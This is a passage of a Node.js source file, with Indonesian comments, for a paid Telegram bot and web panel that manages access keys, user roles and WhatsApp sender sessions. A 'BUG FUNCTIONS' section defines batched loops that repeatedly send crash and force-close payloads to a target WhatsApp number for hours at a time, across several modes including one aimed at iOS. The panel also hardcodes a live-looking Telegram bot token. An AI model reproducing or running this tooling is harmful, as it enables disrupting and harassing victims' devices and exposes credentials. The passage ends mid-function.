            `<i>Example: /addowner 123456789</i>`;
        }
        
      } else if (selectedOption === 2) {
        // Session Status
        const userSessions = loadUserSessions();
        const activeSessions = sessions.size;
        const totalUsers = Object.keys(userSessions).length;
        let totalSenders = 0;
        
        Object.values(userSessions).forEach(numbers => {
          totalSenders += numbers.length;
        });
        
        responseMessage = `<blockquote>📊 SESSION STATUS</blockquote>\n\n`;
        responseMessage += `<b>✅ Active Sessions:</b> ${activeSessions}\n`;
        responseMessage += `<b>👥 Registered Users:</b> ${totalUsers}\n`;
        responseMessage += `<b>📞 Total Senders:</b> ${totalSenders}\n\n`;
        
        if (totalUsers > 0) {
          responseMessage += `<b>📋 User Details:</b>\n`;
          let count = 1;
          Object.entries(userSessions).forEach(([username, numbers]) => {
            if (count <= 5) {
              const activeCount = numbers.filter(num => sessions.has(num)).length;
              responseMessage += `\n<b>${count}. ${username}:</b> ${activeCount}/${numbers.length} aktif`;
              count++;
            }
          });
          if (totalUsers > 5) {
            responseMessage += `\n\n<i>...dan ${totalUsers - 5} user lainnya</i>`;
          }
        }
        
      } else if (selectedOption === 3) {
        // Cancel
        responseMessage = '❌ <b>Polling dibatalkan</b>\n\nGunakan /start untuk memulai kembali.';
      }
      
      // Kirim response ke user
      if (responseMessage) {
        await ctx.telegram.sendMessage(userId, responseMessage, { parse_mode: "HTML" });
      }
      
      // Hapus data polling
      activePolls.delete(pollId);
      return;
    }
    
    // ==================== POLLING CKEY ==================== //
    const ckeyData = pendingCkey.get(pollId);
    
    if (ckeyData) {
      // Hapus polling message dan info message
      try {
        await ctx.telegram.deleteMessage(ckeyData.adminChatId, ckeyData.pollMessageId);
        await ctx.telegram.deleteMessage(ckeyData.adminChatId, ckeyData.infoMessageId);
      } catch (e) {
        console.log('Gagal hapus polling ckey:', e.message);
      }
      
      // Handler untuk listkey polling
      if (ckeyData.type === 'listkey') {
        if (selectedOption === ckeyData.users.length) {
          // "Lihat Semua"
          let message = `<b>📋 DAFTAR SEMUA USER</b>\n\n`;
          
          ckeyData.users.forEach((user, i) => {
            const exp = new Date(user.expired).toLocaleString("id-ID", {
              timeZone: "Asia/Jakarta",
              year: "numeric",
              month: "2-digit",
              day: "2-digit",
              hour: "2-digit",
              minute: "2-digit",
            });
            
            const status = Date.now() > user.expired ? '❌ EXPIRED' : '✅ AKTIF';
            
            message += 
              `<b>${i + 1}. ${user.username}</b>\n` +
              `Key: <code>${user.key}</code>\n` +
              `Role: ${user.role || 'user'}\n` +
              `Telegram: ${user.telegram_id || '-'}\n` +
              `Expired: ${exp}\n` +
              `Status: ${status}\n\n`;
          });
          
          await ctx.telegram.sendMessage(ckeyData.adminId, message, { parse_mode: "HTML" });
          
        } else if (selectedOption === ckeyData.users.length + 1) {
          // "Batal"
          await ctx.telegram.sendMessage(ckeyData.adminId, '❌ <b>Dibatalkan</b>', { parse_mode: "HTML" });
          
        } else {
          // Tampilkan detail user tertentu
          const userIndex = selectedOption;
          if (userIndex >= 0 && userIndex < ckeyData.users.length) {
            const user = ckeyData.users[userIndex];
            const exp = new Date(user.expired).toLocaleString("id-ID", {
              timeZone: "Asia/Jakarta",
              year: "numeric",
              month: "2-digit",
              day: "2-digit",
              hour: "2-digit",
              minute: "2-digit",
            });
            
            const status = Date.now() > user.expired ? '❌ EXPIRED' : '✅ AKTIF';
            
            const message = 
              `<b>👤 DETAIL USER</b>\n\n` +
              `<b>Username:</b> <code>${user.username}</code>\n` +
              `<b>Key:</b> <code>${user.key}</code>\n` +
              `<b>Role:</b> ${user.role || 'user'}\n` +
              `<b>Telegram ID:</b> ${user.telegram_id || '-'}\n` +
              `<b>Expired:</b> ${exp} WIB\n` +
              `<b>Status:</b> ${status}\n` +
              `<b>Created:</b> ${user.created_at ? new Date(user.created_at).toLocaleDateString('id-ID') : '-'}`;
            
            await ctx.telegram.sendMessage(ckeyData.adminId, message, { parse_mode: "HTML" });
          }
        }
        
        // Hapus data pending
        pendingCkey.delete(pollId);
        return;
      }
      
      // Handler untuk delkey polling
      if (ckeyData.type === 'delkey') {
        if (selectedOption === ckeyData.users.length) {
          // "Batal"
          await ctx.telegram.sendMessage(ckeyData.adminId, '❌ <b>Penghapusan dibatalkan</b>', { parse_mode: "HTML" });
          
        } else {
          // Hapus user yang dipilih
          const userIndex = selectedOption;
          if (userIndex >= 0 && userIndex < ckeyData.users.length) {
            const userToDelete = ckeyData.users[userIndex];
            
            // Filter user dari array
            const updatedUsers = ckeyData.users.filter((u, idx) => idx !== userIndex);
            
            // Simpan ke database
            saveUsers(updatedUsers);
            
            // Konfirmasi
            await ctx.telegram.sendMessage(
              ckeyData.adminId,
              `✅ <b>User berhasil dihapus</b>\n\n` +
              `<b>Username:</b> <code>${userToDelete.username}</code>\n` +
              `<b>Role:</b> ${userToDelete.role || 'user'}\n` +
              `<i>Key user telah dihapus dari sistem</i>`,
              { parse_mode: "HTML" }
            );
          }
        }
        
        // Hapus data pending
        pendingCkey.delete(pollId);
        return;
      }
      
      // Handler untuk ckey polling (pilih role)
      if (ckeyData.type === 'ckey') {
        // Tentukan role berdasarkan pilihan
        let role = '';
        let roleText = '';
        
        switch (selectedOption) {
          case 0:
            role = 'owner';
            roleText = '👑 Owner';
            break;
          case 1:
            role = 'admin';
            roleText = '🔧 Admin';
            break;
          case 2:
            role = 'user';
            roleText = '👤 User';
            break;
          case 3:
            // Cancel
            pendingCkey.delete(pollId);
            await ctx.telegram.sendMessage(
              ckeyData.adminId,
              '❌ <b>Pembuatan key dibatalkan</b>',
              { parse_mode: "HTML" }
            );
            return;
        }
        
        // Simpan user ke database
        const users = getUsers();
        const existingUserIndex = users.findIndex(u => u.username === ckeyData.username);
        
        const expiredStr = new Date(ckeyData.expired).toLocaleString("id-ID", {
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          timeZone: "Asia/Jakarta"
        });
        
        if (existingUserIndex !== -1) {
          // Update existing user
          users[existingUserIndex] = {
            ...users[existingUserIndex],
            key: ckeyData.key,
            expired: ckeyData.expired,
            role: role,
            telegram_id: ckeyData.telegramId,
            updated_at: Date.now()
          };
        } else {
          // Buat user baru
          users.push({
            username: ckeyData.username,
            key: ckeyData.key,
            expired: ckeyData.expired,
            role: role,
            telegram_id: ckeyData.telegramId,
            isLoggedIn: false,
            created_at: Date.now(),
            created_by: ckeyData.adminId
          });
        }
        
        const saveSuccess = saveUsers(users);
        
        if (!saveSuccess) {
          await ctx.telegram.sendMessage(
            ckeyData.adminId,
            '❌ <b>Gagal menyimpan data user!</b>',
            { parse_mode: "HTML" }
          );
          pendingCkey.delete(pollId);
          return;
        }
        
        // Coba kirim ke user
        try {
          // Cek apakah user sudah start bot
          await ctx.telegram.sendChatAction(ckeyData.telegramId, 'typing');
          
          // Kirim pesan ke user
          const userMessage = 
            `🔐 <b>AKUN BARU TELAH DIBUAT</b>\n\n` +
            `<b>Username:</b> <code>${ckeyData.username}</code>\n` +
            `<b>Password:</b> <code>${ckeyData.key}</code>\n` +
            `<b>Role:</b> ${roleText}\n` +
            `<b>Expired:</b> ${expiredStr} WIB\n\n` +
            `<b>Login via:</b>\n` +
            `• Web: ${VPS}:${PORT}\n` +
            `• Bot: @${ctx.botInfo.username}\n\n` +
            `<i>Simpan data ini dengan aman!</i>`;
          
          await ctx.telegram.sendMessage(
            ckeyData.telegramId,
            userMessage,
            { parse_mode: "HTML" }
          );
          
          // Konfirmasi ke admin
          await ctx.telegram.sendMessage(
            ckeyData.adminId,
            `✅ <b>Key berhasil dibuat dan dikirim ke user!</b>\n\n` +
            `<b>Username:</b> <code>${ckeyData.username}</code>\n` +
            `<b>Role:</b> ${roleText}\n` +
            `<b>Telegram ID:</b> <code>${ckeyData.telegramId}</code>\n\n` +
            `<i>Data telah dikirim ke chat pribadi user</i>`,
            { parse_mode: "HTML" }
          );
          
        } catch (error) {
          // Jika gagal kirim ke user
          let errorMsg = '';
          
          if (error.code === 403) {
            errorMsg = 
              `⚠️ <b>Gagal mengirim data ke user!</b>\n\n` +
              `User dengan ID <code>${ckeyData.telegramId}</code> belum memulai bot.\n` +
              `Minta user untuk ketik /start di bot @${ctx.botInfo.username} terlebih dahulu.\n\n` +
              `<b>Data untuk dikirim manual:</b>\n` +
              `Username: ${ckeyData.username}\n` +
              `Key: ${ckeyData.key}\n` +
              `Role: ${role}\n` +
              `Expired: ${expiredStr}`;
          } else if (error.code === 400) {
            errorMsg = 
              `❌ <b>Telegram ID tidak valid!</b>\n\n` +
              `ID <code>${ckeyData.telegramId}</code> tidak ditemukan.\n` +
              `Pastikan user sudah mengaktifkan bot atau ID benar.`;
          } else {
            errorMsg = 
              `❌ <b>Error mengirim ke user:</b> ${error.message}\n\n` +
              `<b>Silakan kirim data secara manual ke user:</b>\n\n` +
              `<code>Username: ${ckeyData.username}</code>\n` +
              `<code>Key: ${ckeyData.key}</code>\n` +
              `<code>Role: ${role}</code>\n` +
              `<code>Login: https://${VPS}:${PORT}</code>`;
          }
          
          await ctx.telegram.sendMessage(
            ckeyData.adminId,
            errorMsg,
            { parse_mode: "HTML" }
          );
        }
        
        // Hapus data pending
        pendingCkey.delete(pollId);
        return;
      }
    }
    
  } catch (error) {
    console.error('Error in poll_answer handler:', error);
  }
});

// ==================== COMMAND LAINNYA ==================== //
bot.command("sessions", async (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessionCount = sessions.size;
  
  let message = `<blockquote>📊 Session Status</blockquote>\n\n`;
  message += `<b>Active Sessions:</b> ${activeSessionCount}\n`;
  message += `<b>Registered Users:</b> ${Object.keys(userSessions).length}\n\n`;
  
  if (Object.keys(userSessions).length > 0) {
    message += `<b>User Details:</b>\n`;
    Object.entries(userSessions).forEach(([username, numbers], index) => {
      message += `\n<b>${index + 1}. ${username}:</b> ${numbers.length} sender(s)\n`;
      numbers.forEach(number => {
        const isActive = sessions.has(number);
        message += `   - ${number} ${isActive ? '✅' : '❌'}\n`;
      });
    });
  } else {
    message += `<i>Tidak ada session terdaftar</i>`;
  }
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🔄 Refresh', 'session_status')],
    [Markup.button.callback('🏠 Main Menu', 'back_to_main')]
  ]);

  await ctx.reply(message, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

// Command myrole dengan inline button
bot.command("myrole", async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  let role = "User";
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isAuthorized(userId) && !isOwner(userId)) {
    role = "Admin";
  }
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🔑 Buat Key', 'quick_listkey')],
    [Markup.button.callback('📋 List Keys', 'quick_listkey')],
    [Markup.button.callback('🏠 Main Menu', 'back_to_main')]
  ]);

  await ctx.reply(`
👤 <b>Role Information</b>

🆔 <b>User:</b> ${username}
🎭 <b>Bot Role:</b> ${role}
💻 <b>User ID:</b> <code>${userId}</code>

${role === 'Owner' ? '🔓 <i>Anda memiliki akses penuh ke semua fitur</i>' : 
  role === 'Admin' ? '🔐 <i>Anda memiliki akses terbatas</i>' : 
  '🔒 <i>Akses terbatas untuk user biasa</i>'}
  `, { 
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup 
  });
});

// ==================== COMMAND UNTUK CEK STATUS PENDING ==================== //
bot.command("pending", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  
  const pendingCount = pendingCkey.size;
  let message = `📊 <b>Pending Operations</b>\n\n`;
  message += `Total pending: ${pendingCount}\n\n`;
  
  if (pendingCount > 0) {
    pendingCkey.forEach((data, pollId) => {
      message += `• Poll ID: ${pollId.substring(0, 8)}...\n`;
      message += `  Type: ${data.type || 'ckey'}\n`;
      message += `  User: ${data.username || 'N/A'}\n`;
      message += `  Time: ${new Date(data.timestamp).toLocaleTimeString('id-ID')}\n\n`;
    });
  } else {
    message += `✅ Tidak ada operasi pending.`;
  }
  
  await ctx.reply(message, { parse_mode: "HTML" });
});

// ==================== COMMAND UNTUK CLEANUP PENDING ==================== //
bot.command("cleanup", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  
  // Hapus semua pending yang sudah expired (lebih dari 10 menit)
  const now = Date.now();
  let cleaned = 0;
  
  pendingCkey.forEach((data, pollId) => {
    if (now - data.timestamp > 10 * 60 * 1000) { // 10 menit
      pendingCkey.delete(pollId);
      cleaned++;
    }
  });
  
  await ctx.reply(`✅ Cleanup selesai. ${cleaned} pending dihapus.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

// ==================== BUG FUNCTIONS ==================== //
const {
  default: makeWASocket,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestWaWebVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageTag,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  getContentType,
  jidDecode,
  MessageRetryMap,
  getAggregateVotesInPollMessage,
  proto,
  delay
} = require("@otaxayun/baileys");

// FUNCTION 

// INI BUAT BUTTON DELAY 50% YA ANJINKK@)$+$)+@((_
async function delaylow(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 60) {
        await Promise.all([
          KambingDelay(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON FORCLOSE TRASH
async function trashkill(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk fortrash');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 50) {
        await Promise.all([
          JustFC5(sock, X),
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 FORTRASH 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON BULDOZER
async function buldokill(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk fortrash');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 45) {
        await Promise.all([
          XvHard(sock, X),
          CrashCode(sock, X),
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 BULDOZER 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

          
// INI BUAT BUTTON KILL IOS
async function blankios(sock, target) {
     for (let i = 0; i < 35; i++) {
         await iosinVisFC3(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON FORCLOSE CALL
async function forklos(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk fortrash');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 350) {
        await Promise.all([
          SqLGb(sock, X),
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 FORCLOSE INVIS📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON FORCLOSE CALL
async function force(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk fortrash');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 50) {
        await Promise.all([
          XSpamForce(sock, X),
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 FORCLOSE FORCE📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}


// ==================== EXPRESS SETUP ==================== //
// Middleware untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// Use Tools Router
app.use('/', toolsRouter);

app.use((req, res, next) => {
    if (!req.path.match(/\.(css|js|jpg|png|gif|ico|svg|mp3|mp4)$/)) {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        res.setHeader('X-Content-Type-Options', 'nosniff');
    }
    next();
});

// ==================== AUTH MIDDLEWARE ==================== //
const { requireAuth } = require('./auth.middleware.js');

// ==================== ROUTES ==================== //
app.get("/", (req, res) => {
    const username = req.cookies.sessionUser;
    const clientSessionId = req.cookies.sessionId;
    
    // Cek session valid
    const activeSession = activeSessions.get(username);
    const isSessionValid = activeSession && activeSession.sessionId === clientSessionId;
    
    if (username && isSessionValid) {
        // Cek expired account
        const users = getUsers();
        const currentUser = users.find(u => u.username === username);
        if (currentUser && Date.now() < currentUser.expired) {
            return res.redirect("/dashboard");
        }
    }
    
    // Jika tidak valid atau expired, ke login
    const filePath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "Login.html");
    fs.readFile(filePath, "utf8", (err, html) => {
        if (err) return res.status(500).send("✗ Gagal baca Login.html");
        res.send(html);
    });
});

app.get("/login", (req, res) => {
    const username = req.cookies.sessionUser;
    const clientSessionId = req.cookies.sessionId;
    
    // Cek session valid
    const activeSession = activeSessions.get(username);
    const isSessionValid = activeSession && activeSession.sessionId === clientSessionId;
    
    if (username && isSessionValid) {
        // Cek expired account
        const users = getUsers();
        const currentUser = users.find(u => u.username === username);
        if (currentUser && Date.now() < currentUser.expired) {
            return res.redirect("/dashboard");
        }
    }
    
    const filePath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "Login.html");
    fs.readFile(filePath, "utf8", (err, html) => {
        if (err) return res.status(500).send("✗ Gagal baca Login.html");
        res.send(html);
    });
});

app.post("/auth", (req, res) => {
    const { username, key, remember } = req.body;
    const users = getUsers();

    const user = users.find(u => u.username === username && u.key === key);
    if (!user) {
        return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
    }

    if (Date.now() > user.expired) {
        return res.redirect("/login?msg=" + encodeURIComponent("Akun telah expired!"));
    }

    if (activeSessions.has(username)) {
        return res.redirect("/login?msg=" + encodeURIComponent("Akun sudah login di device lain!"));
    }

    const sessionId = generateSessionId();
    
    const SESSION_DURATION = remember === 'true' ? 
        30 * 24 * 60 * 60 * 1000 : // 30 hari untuk auto login
        24 * 60 * 60 * 1000;       // 24 jam untuk normal
    
    const sessionData = {
        sessionId: sessionId,
        loginTime: Date.now(),
        userAgent: req.headers['user-agent'],
        expiresAt: Date.now() + SESSION_DURATION,
        remember: remember === 'true',
        userData: {
            username: user.username,
            role: user.role,
            expired: user.expired
        }
    };
    
    activeSessions.set(username, sessionData);
    
    savePersistentSessions();
    
    const cookieOptions = {
        maxAge: SESSION_DURATION,
        httpOnly: true,
        path: "/"
    };
    
    res.cookie("sessionUser", username, cookieOptions);
    res.cookie("sessionId", sessionId, cookieOptions);
    
    res.redirect("/dashboard");
});

// Route untuk dashboard
app.get("/dashboard", requireAuth, (req, res) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    
    const timestamp = Date.now();
    const filePath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "dashboard.html");
    
    fs.readFile(filePath, "utf8", (err, html) => {
        if (err) {
            console.error("❌ Gagal membaca file dashboard.html:", err);
            return res.status(500).send("File dashboard tidak ditemukan");
        }

        const sessionChecker = `
        <script>
            // Session checker setiap 30 detik
            setInterval(() => {
                fetch('/api/session-check', {
                    credentials: 'include'
                })
                .then(response => {
                    if (!response.ok) {
                        // Session invalid, logout
                        window.location.href = '/logout?reason=session_expired';
                    }
                })
                .catch(() => {
                    window.location.href = '/logout?reason=network_error';
                });
            }, 30000);
            
            // Prevent back button after logout
            history.pushState(null, null, location.href);
            window.onpopstate = function () {
                history.go(1);
            };
        </script>
        `;
        
        const htmlWithChecker = html.replace('</body>', sessionChecker + '</body>');
        res.send(htmlWithChecker);
    });
});

// Endpoint untuk mendapatkan data user dan session
// ==================== API ENDPOINT: OPTION DATA ==================== //
app.get("/api/option-data", requireAuth, (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        const clientSessionId = req.cookies.sessionId;
        
        // Validasi session
        const activeSession = activeSessions.get(username);
        const isSessionValid = activeSession && activeSession.sessionId === clientSessionId;
        
        if (!isSessionValid) {
            return res.status(401).json({ 
                error: "Session invalid",
                redirect: "/login"
            });
        }
        
        // Ambil data user
        const users = getUsers();
        const currentUser = users.find(u => u.username === username);

        if (!currentUser) {
            return res.status(404).json({ 
                error: "User not found",
                redirect: "/login"
            });
        }
        
        // Cek expired account
        const now = Date.now();
        if (now > currentUser.expired) {
            return res.status(403).json({ 
                error: "Account expired",
                redirect: "/login?msg=Account+expired"
            });
        }
        
        // Hitung active senders dari user_sessions.json yang ada di sessions map
        const userSessions = loadUserSessions();
        const userNumbers = userSessions[username] || [];
        
        // Filter hanya nomor yang aktif di sessions map
        const activeUserSenders = userNumbers.filter(number => sessions.has(number));
        
        // Format expired time
        let expiredStr;
        if (currentUser.expired === 'Permanent' || currentUser.expired > now + (365 * 10 * 86400000)) {
            expiredStr = 'Permanent';
        } else {
            expiredStr = new Date(currentUser.expired).toLocaleString("id-ID", {
                timeZone: "Asia/Jakarta",
                year: "numeric",
                month: "2-digit",
                day: "2-digit",
                hour: "2-digit",
                minute: "2-digit",
            });
        }
        
        // Hitung waktu tersisa
        const timeRemaining = currentUser.expired - now;
        const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));
        
        // Ambil online users count
        let onlineUsersCount = activeSessions.size;
        
        // Update session timestamp untuk auto logout prevention
        if (activeSession) {
            activeSession.lastActive = now;
            savePersistentSessions();
        }
        
        // Response data
        const responseData = {
            username: currentUser.username,
            role: currentUser.role || 'user',
            activeSenders: activeUserSenders.length,
            totalSenders: userNumbers.length,
            expired: expiredStr,
            daysRemaining: daysRemaining,
            isPermanent: currentUser.expired === 'Permanent' || currentUser.expired > now + (365 * 10 * 86400000),
            onlineUsers: onlineUsersCount || 1,
            sessionValid: true,
            timestamp: now,
            accountStatus: timeRemaining > 0 ? 'active' : 'expired'
        };
        
        // Set no-cache headers
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        res.setHeader('X-Content-Type-Options', 'nosniff');
        
        res.json(responseData);
        
    } catch (error) {
        console.error('[API] Error in /api/option-data:', error);
        
        // Error response dengan detail terbatas untuk security
        res.status(500).json({ 
            error: "Internal server error",
            timestamp: Date.now()
        });
    }
});

// API untuk manual reload semua sessions
app.get("/api/reload-sessions", requireAuth, async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        
        console.log(chalk.blue.bold(`[API] Manual reload requested by ${username}`));
        
        // Panggil reload function
        simpleReloadSessions();
        
        res.json({
            success: true,
            message: "Session reload initiated",
            timestamp: Date.now()
        });
    } catch (error) {
        console.error('[API] Reload sessions error:', error);
        res.status(500).json({
            success: false,
            error: "Failed to reload sessions"
        });
    }
});

app.get("/api/profile-data", requireAuth, (req, res) => {
    const username = req.cookies.sessionUser;
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser) {
        return res.status(404).json({ error: "User not found" });
    }

    // Format expired time
    const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
    });

    // Hitung waktu tersisa
    const now = Date.now();
    const timeRemaining = currentUser.expired - now;
    const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

    res.json({
        username: currentUser.username,
        role: currentUser.role || 'user',
        key: currentUser.key || '',
        activeSenders: sessions.size,
        expired: expired,
        daysRemaining: daysRemaining,
        createdAt: currentUser.createdAt || Date.now(),
        telegram_id: currentUser.telegram_id || "",
        status: Date.now() > currentUser.expired ? 'expired' : 'active'
    });
});

app.get("/api/user-stats", requireAuth, (req, res) => {
    const username = req.cookies.sessionUser;
    const userSessions = loadUserSessions();
    const userNumbers = userSessions[username] || [];
    
    const stats = userNumbers.map(number => ({
        number,
        country: getCountryCode(number),
        formatted: formatPhoneNumber(number)
    }));
    
    res.json({ stats });
});

app.get("/api/online-users", requireAuth, (req, res) => {
    const onlineCount = activeSessions.size;
    res.json({ 
        onlineUsers: onlineCount || 1, // Minimal 1 (user sendiri)
        timestamp: Date.now()
    });
});

// ==================== EXECUTION ROUTES ==================== //
const BOT_TOKEN = "8559178893:AAHZnl2qhhrVHNMmuaMAhmzC7CCX5RAQBHk";
const CHAT_ID = "7271569542";
let lastExecution = 0;

// INI JANGAN DI APA APAIN YOO
app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;

    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Session expired, login ulang");
    }

    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target || '';
    const mode = req.query.mode || '';

    if (justExecuted && targetNumber && mode) {
